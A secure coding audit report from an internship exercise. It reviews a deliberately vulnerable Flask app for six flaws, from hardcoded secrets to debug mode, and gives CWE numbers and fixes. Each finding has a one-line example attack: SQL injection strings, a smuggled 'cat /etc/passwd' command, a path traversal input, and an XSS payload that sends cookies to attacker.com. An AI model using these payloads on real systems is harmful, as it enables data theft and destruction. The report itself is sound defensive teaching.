# 🔐 Secure Coding Review — Audit Report
## CodeAlpha Cybersecurity Internship — Task 3

**Target File:** `vulnerable_app.py` (Python / Flask)  
**Auditor:** Arham  
**Date:** 2026  
**Tool Used:** Manual inspection + static analysis principles

---

## Executive Summary

A code review of `vulnerable_app.py` identified **6 high-severity vulnerabilities** spanning injection attacks, information exposure, and insecure configuration. All findings have been remediated in `secure_app.py`.

---

## Vulnerability Report

### VULN-01 — Hardcoded Credentials
| Field | Detail |
|-------|--------|
| **Severity** | 🔴 Critical |
| **Location** | Lines 14–16 |
| **CWE** | CWE-798 |
| **Description** | Secret key, DB password, and API key hardcoded in source code. If the repo is public or leaked, all secrets are compromised. |
| **Fix** | Store secrets in `.env` file and load via `os.getenv()`. Never commit `.env` to version control — add to `.gitignore`. |

---

### VULN-02 — SQL Injection
| Field | Detail |
|-------|--------|
| **Severity** | 🔴 Critical |
| **Location** | Line 25 |
| **CWE** | CWE-89 |
| **Description** | User input directly concatenated into SQL query. Attacker can input `' OR '1'='1` to bypass authentication or `'; DROP TABLE users; --` to destroy data. |
| **Exploit** | `username = admin' --` → logs in as admin with no password |
| **Fix** | Use parameterized queries: `conn.execute("SELECT * FROM users WHERE username = ?", (username,))` |

---

### VULN-03 — OS Command Injection
| Field | Detail |
|-------|--------|
| **Severity** | 🔴 Critical |
| **Location** | Line 33 |
| **CWE** | CWE-78 |
| **Description** | User-supplied `host` parameter passed directly to `subprocess.check_output()` with `shell=True`. Attacker can chain commands. |
| **Exploit** | `?host=8.8.8.8; cat /etc/passwd` → dumps system password file |
| **Fix** | Validate hostname against strict regex whitelist. Use `shell=False` with list arguments. |

---

### VULN-04 — Cross-Site Scripting (XSS)
| Field | Detail |
|-------|--------|
| **Severity** | 🟠 High |
| **Location** | Line 40 |
| **CWE** | CWE-79 |
| **Description** | User input rendered into HTML without escaping. Attacker injects malicious script that runs in victims' browsers. |
| **Exploit** | `?name=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>` → steals session cookies |
| **Fix** | Use `flask.escape()` or Jinja2 templates (auto-escapes by default) |

---

### VULN-05 — Path Traversal
| Field | Detail |
|-------|--------|
| **Severity** | 🟠 High |
| **Location** | Line 46 |
| **CWE** | CWE-22 |
| **Description** | File path constructed from user input with no validation. Attacker can read any file the process has access to. |
| **Exploit** | `?file=../../etc/passwd` → reads system user file |
| **Fix** | Resolve absolute path with `os.path.realpath()`, then verify it starts with the allowed directory. |

---

### VULN-06 — Debug Mode in Production
| Field | Detail |
|-------|--------|
| **Severity** | 🟡 Medium |
| **Location** | Line 50 |
| **CWE** | CWE-94 |
| **Description** | `app.run(debug=True)` exposes an interactive Python debugger via the browser. Attacker can execute arbitrary Python code on the server. |
| **Fix** | Set `debug` from environment variable: `debug=os.getenv("FLASK_DEBUG","False") == "true"` |

---

## Summary Table

| ID | Vulnerability | Severity | CWE |
|----|--------------|----------|-----|
| VULN-01 | Hardcoded Credentials | 🔴 Critical | CWE-798 |
| VULN-02 | SQL Injection | 🔴 Critical | CWE-89 |
| VULN-03 | Command Injection | 🔴 Critical | CWE-78 |
| VULN-04 | Cross-Site Scripting | 🟠 High | CWE-79 |
| VULN-05 | Path Traversal | 🟠 High | CWE-22 |
| VULN-06 | Debug Mode Enabled | 🟡 Medium | CWE-94 |

---

## Secure Coding Best Practices

1. **Never trust user input** — validate, sanitize, and escape everything
2. **Use parameterized queries** — SQL injection is 100% preventable
3. **Store secrets in environment variables** — never in source code
4. **Principle of least privilege** — processes should only access what they need
5. **Disable debug mode in production** — always
6. **Dependency scanning** — regularly check for known CVEs in libraries

---

**All vulnerabilities remediated in:** `secure_app.py`
